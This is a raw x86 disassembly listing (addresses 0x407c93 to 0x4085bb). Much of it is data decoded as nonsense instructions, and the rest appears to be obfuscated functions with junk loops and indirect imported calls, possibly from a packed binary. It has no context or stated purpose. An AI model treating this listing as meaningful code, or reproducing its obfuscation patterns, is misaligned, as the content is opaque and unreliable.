  407c93:	sbb    ah,dl
  407c95:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407c96:	cmc    
  407c97:	fs dec esp
  407c99:	gs xchg ecx,eax
  407c9b:	in     al,0x24
  407c9d:	mov    esi,0x8d6577e7
  407ca2:	and    eax,0xe1657048
  407ca7:	xchg   BYTE PTR [edi-0x13608fe0],cl
  407cad:	inc    esp
  407cae:	jne    0x407c86
  407cb0:	push   esp
  407cb1:	popf   
  407cb2:	enter  0xbcae,0x1a
  407cb6:	mov    dh,0x31
  407cb8:	jae    0x407d14
  407cba:	ja     0x407ccb
  407cbc:	retf   
  407cbd:	push   edi
  407cbe:	or     BYTE PTR [edx-0x4e26d4ea],al
  407cc4:	adc    esi,DWORD PTR [esi]
  407cc6:	adc    ch,bh
  407cc8:	or     al,0xb8
  407cca:	mov    dh,0xc9
  407ccc:	or     ecx,ebx
  407cce:	jne    0x407d35
  407cd0:	mov    ch,bl
  407cd2:	mov    DWORD PTR [edi+0x78da8247],eax
  407cd8:	dec    edx
  407cd9:	jne    0x407d3e
  407cdb:	je     0x407c76
  407cdd:	jno    0x407d33
  407cdf:	xor    cl,BYTE PTR [esi-0x2406f96d]
  407ce5:	aaa    
  407ce6:	xchg   edi,eax
  407ce7:	and    edx,DWORD PTR [eax+ebx*1+0x6]
  407ceb:	sub    DWORD PTR [eax],esp
  407ced:	fwait
  407cee:	jg     0x407d15
  407cf0:	sub    al,0x1f
  407cf2:	or     bh,0x98
  407cf5:	cmp    eax,0x572969fc
  407cfa:	fadd   st,st(4)
  407cfc:	and    eax,0x6a374d15
  407d01:	and    al,0x67
  407d03:	inc    ebp
  407d04:	popa   
  407d05:	in     eax,0x2a
  407d07:	aaa    
  407d08:	sub    al,cl
  407d0a:	pop    edi
  407d0b:	ss imul esp,DWORD PTR ss:[ebp+0x50],0x3b
  407d11:	inc    edx
  407d12:	ror    cl,1
  407d14:	ds xchg ebp,eax
  407d16:	pop    ds
  407d17:	push   ebx
  407d18:	into   
  407d19:	repnz data16 lods al,BYTE PTR ds:[esi]
  407d1c:	int    0x38
  407d1e:	or     DWORD PTR [edx],eax
  407d20:	and    esi,edx
  407d22:	in     al,0x13
  407d24:	cs into 
  407d26:	pop    ss
  407d27:	imul   ebp
  407d29:	out    dx,eax
  407d2a:	adc    edx,edx
  407d2c:	sbb    al,BYTE PTR [eax]
  407d2e:	pop    DWORD PTR ds:0xd16e85fb
  407d34:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407d35:	mov    eax,ds:0x769dc145
  407d3a:	jge    0x407d7e
  407d3c:	stos   BYTE PTR es:[edi],al
  407d3d:	sub    ah,BYTE PTR [eax]
  407d3f:	mov    cl,0x7a
  407d41:	clc    
  407d42:	add    edi,esp
  407d44:	adc    eax,0xdeb6beac
  407d49:	sub    al,0x74
  407d4b:	jae    0x407cde
  407d4d:	(bad)
  407d51:	fist   WORD PTR [edx+0x30]
  407d54:	gs mov dh,al
  407d57:	lds    ecx,FWORD PTR [edi-0x34567704]
  407d5d:	xor    al,0x29
  407d5f:	stos   DWORD PTR es:[edi],eax
  407d60:	sub    bl,bl
  407d62:	dec    edi
  407d63:	mov    bl,0x61
  407d65:	sub    dh,BYTE PTR [ecx-0x6e0bebf3]
  407d6b:	mov    dh,BYTE PTR [ebp-0x74]
  407d6e:	adc    DWORD PTR [edi],ebx
  407d70:	jo     0x407d2d
  407d72:	leave  
  407d73:	pop    ebp
  407d74:	xor    edx,DWORD PTR [esi+0x4a7c47fb]
  407d7a:	adc    eax,0x5cec8e7c
  407d7f:	mov    ds,edi
  407d81:	push   ecx
  407d82:	mov    WORD PTR [ebp+0x3b5e9bb2],gs
  407d88:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407d89:	sbb    al,0xd2
  407d8b:	jae    0x407dff
  407d8d:	data16 hlt 
  407d8f:	dec    ecx
  407d90:	dec    ebp
  407d91:	daa    
  407d92:	jo     0x407d92
  407d94:	push   esi
  407d95:	cmc    
  407d96:	jmp    0x5c3:0x4b593c85
  407d9d:	mov    edx,0xb5dec40c
  407da2:	sbb    BYTE PTR [esp+ebp*8],0x8c
  407da6:	mov    al,ds:0x6f389ab4
  407dab:	push   ebx
  407dac:	inc    ebx
  407dad:	out    dx,eax
  407dae:	aas    
  407daf:	inc    edi
  407db0:	sub    eax,0x37005e57
  407db5:	sub    edi,esp
  407db7:	pusha  
  407db8:	stos   DWORD PTR es:[edi],eax
  407db9:	imul   ebp,DWORD PTR [ebx+0x4a],0x74f443ee
  407dc0:	gs jmp 0x108d:0x65deb82e
  407dc8:	xor    dh,BYTE PTR [edi]
  407dca:	cmp    edi,ebx
  407dcc:	shl    BYTE PTR [ebx],0xc4
  407dcf:	push   0xffffff8f
  407dd1:	ficomp DWORD PTR [ebp-0x3f63ff23]
  407dd7:	ja     0x407d9f
  407dd9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407dda:	je     0x407dbc
  407ddc:	mov    al,ds:0xfc64fcb6
  407de1:	sbb    esi,DWORD PTR [ebx]
  407de3:	jg     0x407e1b
  407de5:	pushf  
  407de6:	jl     0x407d83
  407de8:	mov    edi,DWORD PTR [edi-0x35]
  407deb:	jns    0x407d6e
  407ded:	inc    ebp
  407dee:	fistp  WORD PTR [edi]
  407df0:	cld    
  407df1:	add    al,0x2a
  407df3:	pop    esi
  407df4:	adc    DWORD PTR [ebp+ecx*1+0x15],eax
  407df8:	jbe    0x407e55
  407dfa:	clc    
  407dfb:	mov    bl,BYTE PTR [edx-0x2b2dc58]
  407e01:	sahf   
  407e02:	aas    
  407e03:	sub    BYTE PTR ds:0xa04f3149,ch
  407e09:	lock in eax,0x8f
  407e0c:	hlt    
  407e0d:	imul   ebp,DWORD PTR [esp+ecx*2+0x4b],0x9a27502b
  407e15:	ret    0x72a4
  407e18:	mov    ebx,0xb58e6aa5
  407e1d:	dec    edx
  407e1e:	pop    eax
  407e1f:	xchg   BYTE PTR [ecx-0x4c76bcf3],bl
  407e25:	sbb    DWORD PTR [ecx-0x1fb6c48b],0xb7b3a1bf
  407e2f:	test   al,0xce
  407e31:	cmp    BYTE PTR [edi+0x5e4c28b1],0xa5
  407e38:	out    dx,al
  407e39:	in     eax,0x84
  407e3b:	scas   eax,DWORD PTR es:[edi]
  407e3c:	into   
  407e3d:	ficomp DWORD PTR [ebx-0x60b0f4e2]
  407e43:	ins    DWORD PTR es:[edi],dx
  407e44:	or     eax,0x7b0a8022
  407e49:	fadd   DWORD PTR [ebx+0x6c]
  407e4c:	js     0x407ec4
  407e4e:	repz mov eax,ds:0x1bdb4cfb
  407e54:	nop
  407e55:	retf   
  407e56:	adc    eax,0x7edadb98
  407e5b:	sbb    DWORD PTR [ecx],0x78
  407e5e:	mov    edx,0x10892e59
  407e63:	mov    eax,DWORD PTR [ebp-0xc]
  407e66:	cmp    eax,0x823721f2
  407e6b:	je     0x407e88
  407e71:	mov    eax,DWORD PTR [ebp-0x1c]
  407e74:	or     DWORD PTR [eax],0x60751c9e
  407e7a:	mov    eax,DWORD PTR [ebp-0x8]
  407e7d:	xor    eax,ecx
  407e7f:	add    eax,esi
  407e81:	pop    edi
  407e82:	pop    esi
  407e83:	pop    ebx
  407e84:	leave  
  407e85:	ret    0x4
  407e88:	mov    eax,DWORD PTR [ebp-0xc]
  407e8b:	add    eax,DWORD PTR [ebp-0x18]
  407e8e:	cmp    eax,0x7ad64f9b
  407e93:	je     0x407ea7
  407e99:	mov    eax,DWORD PTR [ebp-0x10]
  407e9c:	and    DWORD PTR [eax],0x751c99
  407ea2:	jmp    0x407e7a
  407ea7:	mov    eax,DWORD PTR [ebp-0xc]
  407eaa:	mov    edx,DWORD PTR [ebp-0x18]
  407ead:	or     eax,edx
  407eaf:	cmp    eax,0xfabf2dfb
  407eb4:	je     0x407ec8
  407eba:	mov    eax,DWORD PTR [ebp-0x10]
  407ebd:	xor    DWORD PTR [eax],0x2650fa8f
  407ec3:	jmp    0x407e7a
  407ec8:	mov    ax,WORD PTR [ebp-0x4]
  407ecc:	mov    edi,DWORD PTR [ebp+0x8]
  407ecf:	mov    edi,DWORD PTR [edi]
  407ed1:	mov    edx,0x8a3c
  407ed6:	xor    ax,dx
  407ed9:	mov    edx,0x3b02
  407ede:	add    ax,dx
  407ee1:	cmp    ax,WORD PTR [edi]
  407ee4:	je     0x407f31
  407eea:	mov    eax,DWORD PTR [ebp-0x14]
  407eed:	xor    eax,ecx
  407eef:	add    eax,esi
  407ef1:	mov    DWORD PTR [ebp-0x24],eax
  407ef4:	mov    eax,DWORD PTR [ebp-0x28]
  407ef7:	mov    di,WORD PTR [ebp-0x2c]
  407efb:	mov    ebx,0x8a3c
  407f00:	xor    di,bx
  407f03:	add    di,dx
  407f06:	movzx  edx,di
  407f09:	mov    edi,DWORD PTR [ebp-0x8]
  407f0c:	xor    edi,ecx
  407f0e:	lea    edx,[edx+edi*1+0x32729b]
  407f15:	add    DWORD PTR [eax],edx
  407f17:	mov    eax,DWORD PTR [ebp-0x20]
  407f1a:	mov    edx,DWORD PTR [ebp-0x8]
  407f1d:	mov    edi,DWORD PTR [ebp-0x24]
  407f20:	xor    edx,ecx
  407f22:	add    edx,esi
  407f24:	imul   edx,edi
  407f27:	sub    DWORD PTR [eax],edx
  407f29:	mov    eax,DWORD PTR [ebp-0x14]
  407f2c:	jmp    0x407e7d
  407f31:	mov    eax,DWORD PTR [ebp-0xc]
  407f34:	mov    edx,DWORD PTR [ebp-0x18]
  407f37:	xor    eax,edx
  407f39:	cmp    eax,0x7aa80c5b
  407f3e:	je     0x407e7a
  407f44:	mov    eax,DWORD PTR [ebp-0x10]
  407f47:	add    DWORD PTR [eax],0x7403501
  407f4d:	jmp    0x407e7a
  407f52:	mov    eax,DWORD PTR [ebp-0x1c]
  407f55:	cmp    DWORD PTR [eax],edi
  407f57:	je     0x407e7a
  407f5d:	mov    eax,0x800f1c9a
  407f62:	jmp    0x407e81
  407f67:	push   ebp
  407f68:	mov    ebp,esp
  407f6a:	sub    esp,0x20
  407f6d:	adc    ecx,eax
  407f6f:	mov    eax,ds:0x413b34
  407f74:	mov    eax,DWORD PTR [eax+0x198]
  407f7a:	movzx  ecx,BYTE PTR ds:0x43366b
  407f81:	or     DWORD PTR ds:0x43366f,ecx
  407f87:	mov    DWORD PTR [ebp-0x8],eax
  407f8a:	or     DWORD PTR ds:0x4336d7,0x6995
  407f94:	mov    eax,DWORD PTR [ebp+0x8]
  407f97:	mov    ecx,DWORD PTR [ebp-0x8]
  407f9a:	or     DWORD PTR ds:0x4336d3,0x2a5
  407fa4:	push   ebx
  407fa5:	xor    ebx,ebx
  407fa7:	xor    ebx,DWORD PTR ds:0x43371b
  407fad:	sub    DWORD PTR ds:0x4336a7,ebx
  407fb3:	push   esi
  407fb4:	mov    esi,0x7510854
  407fb9:	sub    ebx,DWORD PTR ds:0x43365b
  407fbf:	xor    eax,esi
  407fc1:	and    DWORD PTR ds:0x4336ab,0x0
  407fcb:	jmp    0x407fdd
  407fd0:	mov    ebx,DWORD PTR ds:0x4336ab
  407fd6:	inc    ebx
  407fd7:	mov    DWORD PTR ds:0x4336ab,ebx
  407fdd:	cmp    DWORD PTR ds:0x4336ab,0x17
  407fe4:	jae    0x408024
  407fea:	cmp    DWORD PTR ds:0x4336ab,0x7
  407ff1:	jne    0x408005
  407ff7:	push   0x4338e7
  407ffc:	push   DWORD PTR [ebp-0x10]
  407fff:	call   DWORD PTR ds:0x4120d4
  408005:	cmp    DWORD PTR ds:0x4336ab,0x6
  40800c:	jne    0x40801f
  408012:	mov    ebx,DWORD PTR ds:0x4336ab
  408018:	inc    ebx
  408019:	mov    DWORD PTR ds:0x4336ab,ebx
  40801f:	jmp    0x407fd0
  408024:	push   edi
  408025:	neg    ebx
  408027:	mov    edi,0x32729b
  40802c:	and    DWORD PTR ds:0x4336ab,0x0
  408036:	jmp    0x408048
  40803b:	mov    ebx,DWORD PTR ds:0x4336ab
  408041:	inc    ebx
  408042:	mov    DWORD PTR ds:0x4336ab,ebx
  408048:	cmp    DWORD PTR ds:0x4336ab,0x1c
  40804f:	jae    0x408092
  408055:	cmp    DWORD PTR ds:0x4336ab,0x9
  40805c:	jne    0x40806d
  408062:	push   0x214e
  408067:	call   DWORD PTR ds:0x4122a0
  40806d:	cmp    DWORD PTR ds:0x4336ab,0x8
  408074:	jne    0x408087
  40807a:	mov    ebx,DWORD PTR ds:0x4336ab
  408080:	inc    ebx
  408081:	mov    DWORD PTR ds:0x4336ab,ebx
  408087:	jmp    0x40803b
  40808c:	sub    ebx,0x76f3
  408092:	add    eax,edi
  408094:	mov    DWORD PTR [ecx],eax
  408096:	add    DWORD PTR ds:0x4335fb,0x1c72
  4080a0:	lea    eax,[ebp-0x4]
  4080a3:	not    ebx
  4080a5:	mov    DWORD PTR [ebp-0x10],eax
  4080a8:	mov    eax,DWORD PTR [ebp+0x8]
  4080ab:	mov    ebx,DWORD PTR ds:0x4336db
  4080b1:	and    DWORD PTR ds:0x4336e3,ebx
  4080b7:	mov    ecx,DWORD PTR [ebp-0x10]
  4080ba:	and    DWORD PTR ds:0x43369b,0x5cf4
  4080c4:	xor    eax,esi
  4080c6:	add    eax,edi
  4080c8:	mov    DWORD PTR [ecx],eax
  4080ca:	and    DWORD PTR ds:0x433723,0x0
  4080d4:	xor    ebx,ebx
  4080d6:	or     ebx,DWORD PTR ds:0x433723
  4080dc:	inc    ebx
  4080dd:	mov    DWORD PTR ds:0x433723,ebx
  4080e3:	cmp    DWORD PTR ds:0x433723,0x8
  4080ea:	jne    0x408101
  4080f0:	push   DWORD PTR [ebp-0x10]
  4080f3:	push   0x4336db
  4080f8:	push   DWORD PTR [ebp-0x1c]
  4080fb:	call   DWORD PTR ds:0x412350
  408101:	cmp    DWORD PTR ds:0x433723,0x7
  408108:	jne    0x40811d
  40810e:	xor    ebx,ebx
  408110:	add    ebx,DWORD PTR ds:0x433723
  408116:	inc    ebx
  408117:	mov    DWORD PTR ds:0x433723,ebx
  40811d:	cmp    DWORD PTR ds:0x433723,0x1a
  408124:	jb     0x4080d4
  40812a:	mov    DWORD PTR [ebp-0x14],0xf89c8531
  408131:	mov    DWORD PTR ds:0x433717,0x1f
  40813b:	cmp    DWORD PTR ds:0x433717,0x0
  408142:	je     0x40817a
  408148:	cmp    DWORD PTR ds:0x433717,0x23
  40814f:	jne    0x408168
  408155:	push   DWORD PTR [ebp-0x1c]
  408158:	push   0x3614
  40815d:	push   0x7
  40815f:	push   DWORD PTR [ebp-0xc]
  408162:	call   DWORD PTR ds:0x4120d8
  408168:	mov    ecx,DWORD PTR ds:0x433717
  40816e:	dec    ecx
  40816f:	mov    DWORD PTR ds:0x433717,ecx
  408175:	jmp    0x40813b
  40817a:	lea    eax,[ebp-0x14]
  40817d:	jmp    0x4083c4
  408182:	ss xor esi,ebp
  408185:	lods   eax,DWORD PTR ds:[esi]
  408186:	jmp    0xc3f1f6fc
  40818b:	push   es
  40818c:	mov    ebp,0xc637530d
  408191:	jle    0x4081d1
  408193:	retf   0x7e7e
  408196:	and    al,0x7c
  408198:	jle    0x408218
  40819a:	pushf  
  40819b:	mov    cl,0x3e
  40819d:	shl    DWORD PTR [eax-0x6c4dfad3],1
  4081a3:	inc    ecx
  4081a4:	(bad)  
  4081a5:	fbstp  TBYTE PTR [edx+0x46d59947]
  4081ab:	nop
  4081ac:	mov    al,0x31
  4081ae:	mov    ds:0x3c300072,eax
  4081b3:	(bad)
  4081b7:	jl     0x4081dc
  4081b9:	cmc    
  4081ba:	loope  0x408203
  4081bc:	and    al,0xb7
  4081be:	push   cs
  4081bf:	frstor [ecx+0x73]
  4081c2:	adc    al,0xb1
  4081c4:	inc    esi
  4081c5:	int    0x59
  4081c7:	(bad)  [ebx-0x29]
  4081ca:	add    esp,DWORD PTR [ebx+0x2df91492]
  4081d0:	push   esp
  4081d1:	mov    ds:0x4472296a,al
  4081d6:	sti    
  4081d7:	xor    eax,eax
  4081d9:	or     ebx,DWORD PTR [esi+0x41]
  4081dc:	fiadd  WORD PTR [esi]
  4081de:	aas    
  4081df:	jno    0x4081f1
  4081e1:	sub    eax,0x7adb9484
  4081e6:	gs push esp
  4081e8:	jo     0x4081f5
  4081ea:	and    eax,0x66d01246
  4081ef:	lock add ecx,DWORD PTR [ecx]
  4081f2:	mov    esi,DWORD PTR [esi+0x668a7042]
  4081f8:	out    0xa7,eax
  4081fa:	pop    eax
  4081fb:	pop    ebx
  4081fc:	shr    al,0x98
  4081ff:	jnp    0x4081db
  408201:	sub    BYTE PTR [eax+0x196edb5c],bl
  408207:	mov    ah,0x79
  408209:	add    DWORD PTR [edi-0x4dbcafd4],edx
  40820f:	adc    DWORD PTR [eax-0x462f5aee],0xe17c35d7
  408219:	outs   dx,BYTE PTR ds:[esi]
  40821a:	int3   
  40821b:	scas   al,BYTE PTR es:[edi]
  40821c:	mov    dh,0x2f
  40821e:	mov    esp,0xb4ac891f
  408223:	mov    eax,ds:0xa8f7e5f7
  408228:	ins    DWORD PTR es:[edi],dx
  408229:	ins    BYTE PTR es:[edi],dx
  40822a:	jno    0x408291
  40822c:	dec    esp
  40822d:	adc    BYTE PTR [edx+ecx*1],ch
  408230:	pusha  
  408231:	mov    ch,0x4e
  408233:	test   BYTE PTR [ecx],0x61
  408236:	cmp    BYTE PTR [ebp-0xb88cad1],ah
  40823c:	cld    
  40823d:	nop
  40823e:	pushf  
  40823f:	fwait
  408240:	cdq    
  408241:	std    
  408242:	dec    ebp
  408243:	ret    
  408244:	cmp    eax,0x93d74470
  408249:	ja     0x40820a
  40824b:	call   FWORD PTR [edx]
  40824d:	outs   dx,DWORD PTR ds:[esi]
  40824e:	popa   
  40824f:	cwde   
  408250:	cld    
  408251:	les    ebp,FWORD PTR [edx+0x49]
  408254:	or     cl,BYTE PTR ds:0xb6f56bc9
  40825a:	ins    BYTE PTR es:[edi],dx
  40825b:	lds    ebx,FWORD PTR [edi+0x2ccdd11e]
  408261:	pop    ss
  408262:	loope  0x408207
  408264:	mov    dh,0x2f
  408266:	les    ebx,FWORD PTR [esi+0x16]
  408269:	xchg   esp,eax
  40826a:	ret    0xae46
  40826d:	jb     0x408262
  40826f:	stos   BYTE PTR es:[edi],al
  408270:	jbe    0x40820a
  408272:	(bad)  
  408273:	out    0x10,al
  408275:	ja     0x40825c
  408277:	(bad)  
  408278:	add    esp,edi
  40827a:	push   ebp
  40827b:	mov    al,ds:0x9d93d1e9
  408280:	sbb    BYTE PTR [esi+0x52f39639],ch
  408286:	xchg   ch,bh
  408288:	mov    al,BYTE PTR [esi+esi*4]
  40828b:	dec    esp
  40828c:	mov    ebx,0xdc7519cc
  408291:	inc    edx
  408292:	or     DWORD PTR [edx-0x2f59ddf7],0xb
  408299:	stc    
  40829a:	xchg   edi,eax
  40829b:	add    eax,DWORD PTR [edi-0x3ff16d8]
  4082a1:	icebp  
  4082a2:	jbe    0x408296
  4082a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4082a5:	repnz (bad) 
  4082a7:	repz iret 
  4082a9:	mov    ds:0x347228e2,eax
  4082ae:	xchg   edx,eax
  4082af:	push   0xffffffdb
  4082b1:	aam    0x3f
  4082b3:	adc    eax,0x176a5632
  4082b8:	push   edx
  4082b9:	cld    
  4082ba:	mov    dh,0x47
  4082bc:	ret    0x5828
  4082bf:	cwde   
  4082c0:	mov    cs,WORD PTR [ecx-0x4f]
  4082c3:	js     0x408274
  4082c5:	icebp  
  4082c6:	jae    0x4082a3
  4082c8:	scas   al,BYTE PTR es:[edi]
  4082c9:	pop    ds
  4082ca:	add    bh,dl
  4082cc:	add    dl,BYTE PTR [ecx-0x3f]
  4082cf:	add    ecx,ecx
  4082d1:	scas   eax,DWORD PTR es:[edi]
  4082d2:	ja     0x408329
  4082d4:	cs and eax,0x98b60ec1
  4082da:	fbstp  TBYTE PTR [edi-0x38c80ba]
  4082e0:	scas   eax,DWORD PTR es:[edi]
  4082e1:	or     DWORD PTR [edx],0xffffffa0
  4082e4:	sbb    eax,0x296b857b
  4082e9:	clc    
  4082ea:	add    ah,dh
  4082ec:	sub    ecx,DWORD PTR [edi]
  4082ee:	in     al,0x98
  4082f0:	test   DWORD PTR [edx-0x23],ebx
  4082f3:	fs or  al,0xf6
  4082f6:	xchg   edx,eax
  4082f7:	imul   ebx,DWORD PTR [esi-0x60147653],0x39559ca
  408301:	dec    ebx
  408302:	dec    ebp
  408303:	mov    dl,0xa6
  408305:	nop
  408306:	or     ch,BYTE PTR [eax+edx*4+0x521051da]
  40830d:	sbb    al,al
  40830f:	jns    0x408302
  408311:	dec    ecx
  408312:	pop    esi
  408313:	pop    ecx
  408314:	dec    ebx
  408315:	dec    dx
  408317:	mov    bl,0x7
  408319:	(bad)  
  40831b:	pop    edx
  40831c:	cmp    BYTE PTR [esi+0xa],ch
  40831f:	mov    eax,esi
  408321:	call   0x13d5:0xcf8b339
  408328:	mov    esi,0x32c5e2de
  40832d:	push   eax
  40832e:	jo     0x40833c
  408330:	pop    esp
  408331:	ins    BYTE PTR es:[edi],dx
  408332:	scas   eax,DWORD PTR es:[edi]
  408333:	pop    es
  408334:	es aaa 
  408336:	or     BYTE PTR [ecx],cl
  408338:	gs daa 
  40833a:	fldenv [edx+0x2]
  40833d:	xchg   DWORD PTR ds:0x8226c87,esi
  408343:	jno    0x40839d
  408345:	hlt    
  408346:	imul   ebp,DWORD PTR [eax-0x2d],0x228223cb
  40834d:	pop    edx
  40834e:	push   ss
  40834f:	pop    edi
  408350:	dec    edx
  408351:	inc    ecx
  408352:	pop    ebp
  408353:	es pop ss
  408355:	xchg   edx,eax
  408356:	push   ecx
  408357:	mov    eax,0x900b7b98
  40835c:	sub    ecx,DWORD PTR [edx-0x6ee064d6]
  408362:	fisubr DWORD PTR [esp+eax*4]
  408365:	inc    esi
  408366:	mov    WORD PTR [ebp+0x73e90371],gs
  40836c:	jbe    0x4082f1
  40836e:	retf   0xab8
  408371:	xchg   esi,eax
  408372:	js     0x408361
  408374:	xchg   dl,dh
  408376:	push   cs
  408377:	out    0x86,al
  408379:	dec    edx
  40837a:	cmc    
  40837b:	(bad)  [ebx]
  40837d:	jmp    esi
  40837f:	sti    
  408380:	jl     0x4083fb
  408382:	pop    esi
  408383:	mov    edi,0x45bc2522
  408388:	adc    al,0xc4
  40838a:	inc    edi
  40838b:	test   eax,0x39d93527
  408390:	arpl   WORD PTR [edx-0x5994e4b6],ax
  408396:	out    0x3f,al
  408398:	mov    al,0x62
  40839a:	mov    edx,0x949a7dce
  40839f:	in     eax,dx
  4083a0:	les    esi,FWORD PTR [esp+esi*1-0x649c6d91]
  4083a7:	mov    WORD PTR [edx],ss
  4083a9:	adc    ah,0xce
  4083ac:	lea    ecx,[ebp-0x75]
  4083af:	repz test al,0x51
  4083b2:	shl    DWORD PTR [ebp+eiz*8-0x33],cl
  4083b6:	pop    ss
  4083b7:	ja     0x408353
  4083b9:	adc    esp,ebx
  4083bb:	jb     0x408419
  4083bd:	push   ecx
  4083be:	shr    DWORD PTR [eax+0x3c],cl
  4083c1:	pop    edx
  4083c2:	loopne 0x408397
  4083c4:	mov    DWORD PTR [ebp-0x20],eax
  4083c7:	and    DWORD PTR ds:0x43365b,0x0
  4083d1:	mov    eax,ds:0x43365b
  4083d6:	inc    eax
  4083d7:	mov    ds:0x43365b,eax
  4083dc:	cmp    DWORD PTR ds:0x43365b,0x6
  4083e3:	jne    0x4083f7
  4083e9:	push   DWORD PTR [ebp-0x20]
  4083ec:	push   0x3975
  4083f1:	call   DWORD PTR ds:0x412354
  4083f7:	cmp    DWORD PTR ds:0x43365b,0x5
  4083fe:	jne    0x408412
  408404:	xor    eax,eax
  408406:	or     eax,DWORD PTR ds:0x43365b
  40840c:	inc    eax
  40840d:	mov    ds:0x43365b,eax
  408412:	cmp    DWORD PTR ds:0x43365b,0x19
  408419:	jb     0x4083d1
  40841f:	inc    ebx
  408420:	mov    eax,DWORD PTR [ebp-0x14]
  408423:	or     DWORD PTR ds:0x43360b,0x6df5
  40842d:	mov    ecx,DWORD PTR [ebp-0x20]
  408430:	xor    ebx,0x4a96
  408436:	xor    eax,esi
  408438:	add    ebx,0x7cb
  40843e:	add    eax,edi
  408440:	xor    DWORD PTR ds:0x433613,ecx
  408446:	mov    DWORD PTR [ecx],eax
  408448:	mov    eax,ds:0x413c08
  40844d:	adc    ebx,DWORD PTR ds:0x433727
  408453:	jmp    0x40869a
  408458:	xchg   BYTE PTR [ebp-0x19],bl
  40845b:	inc    ebx
  40845c:	in     eax,0x41
  40845e:	mov    ds:0x7a26859,al
  408463:	das    
  408464:	mov    dl,0x1f
  408466:	push   0xffffffc2
  408468:	in     al,0xc8
  40846a:	jle    0x4084ea
  40846c:	and    al,0x7c
  40846e:	jle    0x4084ee
  408470:	push   esi
  408471:	jge    0x40847f
  408473:	retf   0x17b
  408476:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408477:	push   0xffffffa4
  408479:	mov    esp,DWORD PTR [ecx]
  40847b:	mov    cl,bh
  40847d:	mov    esi,0x7e53d3eb
  408482:	call   0xb123:0xd18ea4cb
  408489:	stos   BYTE PTR es:[edi],al
  40848a:	ficomp WORD PTR [edx+esi*8-0xd4cb592]
  408491:	push   ebp
  408493:	mov    bh,0x1c
  408495:	aas    
  408496:	ja     0x40847e
  408498:	mov    ebp,0x3a016615
  40849d:	js     0x408455
  40849f:	fcmovu st,st(4)
  4084a1:	es daa 
  4084a3:	dec    ebp
  4084a4:	cmp    edx,ebp
  4084a6:	cmp    BYTE PTR [ebx+0x725ac82d],0x4e
  4084ad:	mov    bh,0x7f
  4084af:	sti    
  4084b0:	dec    eax
  4084b1:	xchg   ebx,eax
  4084b2:	and    ebx,DWORD PTR [ecx+0x48eac710]
  4084b8:	xchg   BYTE PTR [edx+0x5aac2a21],ah
  4084be:	enter  0xd1fa,0x2b
  4084c2:	sbb    al,BYTE PTR [ecx+0x40]
  4084c5:	jle    0x4084f0
  4084c7:	mov    ah,0x90
  4084c9:	and    BYTE PTR [eax+ecx*2],al
  4084cc:	stos   BYTE PTR es:[edi],al
  4084cd:	inc    esi
  4084ce:	adc    al,0xec
  4084d0:	js     0x408465
  4084d2:	add    DWORD PTR ds:[edi+0x4acdd48d],ebx
  4084d9:	stos   DWORD PTR es:[edi],eax
  4084da:	into   
  4084db:	push   esi
  4084dc:	nop
  4084dd:	or     eax,0xe43300eb
  4084e2:	push   cs
  4084e3:	or     ah,BYTE PTR [edx-0x6ec2d9b6]
  4084e9:	out    0xb9,eax
  4084eb:	pop    ecx
  4084ec:	cmp    al,0xe4
  4084ee:	enter  0x2ec1,0x20
  4084f2:	jno    0x40856f
  4084f4:	ins    DWORD PTR es:[edi],dx
  4084f5:	je     0x40851c
  4084f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4084f8:	xchg   BYTE PTR [ecx+0x5e023bc1],cl
  4084fe:	leave  
  4084ff:	sub    BYTE PTR [ebp+0x2f17e843],ch
  408505:	rcl    DWORD PTR [ecx-0x4422395a],1
  40850b:	stos   BYTE PTR es:[edi],al
  40850c:	fiadd  WORD PTR [eax]
  40850e:	addr16 xabort 0xb1
  408512:	ins    BYTE PTR es:[edi],dx
  408513:	cwde   
  408514:	dec    eax
  408515:	mov    ebp,DWORD PTR [edx-0x59]
  408518:	outs   dx,DWORD PTR ds:[esi]
  408519:	dec    esp
  40851a:	add    edx,DWORD PTR [edi]
  40851c:	xor    DWORD PTR [ebx],ecx
  40851e:	jbe    0x408517
  408520:	mov    dh,0x99
  408522:	cdq    
  408523:	fdiv   QWORD PTR [ebx+0x65804954]
  408529:	xchg   ecx,eax
  40852a:	fimul  DWORD PTR [ebx-0x4f61d2e7]
  408530:	push   eax
  408531:	cwde   
  408532:	and    eax,0xa8c1c7ec
  408537:	daa    
  408538:	mov    ecx,0x56217a7f
  40853d:	mov    esp,0x1060831a
  408542:	and    DWORD PTR ds:0x585ac8a0,ebx
  408548:	or     BYTE PTR [edx],0x74
  40854b:	sbb    bh,bh
  40854d:	loop   0x4084f1
  40854f:	sbb    edi,DWORD PTR [eax+0xb]
  408552:	div    BYTE PTR [ebp-0x70]
  408555:	jb     0x4084d7
  408557:	push   es
  408558:	xchg   DWORD PTR [ebx+0x6e],edx
  40855b:	jnp    0x4085af
  40855d:	sub    ah,BYTE PTR ds:0xd3892996
  408563:	in     al,0xd1
  408565:	fwait
  408566:	mov    eax,ds:0xad99e058
  40856b:	fst    QWORD PTR [ecx+eax*4-0x71eed98]
  408572:	std    
  408573:	inc    edx
  408574:	(bad)  
  408575:	cmc    
  408576:	mov    cl,0x96
  408578:	or     eax,0xe0580c66
  40857d:	shr    BYTE PTR [edx],0xe0
  408580:	lahf   
  408581:	cmc    
  408582:	and    eax,DWORD PTR [esi+0x324550f6]
  408588:	adc    BYTE PTR [edi-0x19],al
  40858b:	fidiv  WORD PTR [ecx]
  40858d:	push   es
  40858e:	xchg   ecx,eax
  40858f:	xor    BYTE PTR [eax+0x1d],dl
  408592:	fimul  WORD PTR [esi+0x2de279e3]
  408598:	pusha  
  408599:	arpl   WORD PTR [ebp-0x6033845],di
  40859f:	jae    0x4085ba
  4085a1:	test   BYTE PTR [ecx-0x12],0x16
  4085a5:	aas    
  4085a6:	and    DWORD PTR [edx-0x262417f6],edx
  4085ac:	cld    
  4085ad:	jno    0x408589
  4085af:	push   eax
  4085b0:	pop    eax
  4085b1:	cli    
  4085b2:	mov    eax,ds:0xb2111e1f
  4085b7:	xchg   edx,eax
  4085b8:	in     eax,dx
  4085b9:	add    al,0xee
  4085bb:	cld    
